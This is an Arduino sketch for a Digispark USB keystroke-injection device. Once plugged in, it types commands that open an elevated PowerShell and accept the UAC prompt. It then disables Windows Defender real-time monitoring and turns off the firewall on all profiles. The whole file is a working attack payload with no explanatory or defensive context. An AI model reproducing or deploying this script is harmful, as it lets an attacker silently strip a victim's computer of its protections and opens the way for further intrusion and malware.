#include "DigiKeyboard.h"

void setup() {}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(250);
  DigiKeyboard.println("powershell Start-Process powershell -Verb runAs");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("Set-MpPreference -DisableRealtimeMonitoring $true"); 
  DigiKeyboard.delay(100);
  DigiKeyboard.println("Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False");
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(5000);
}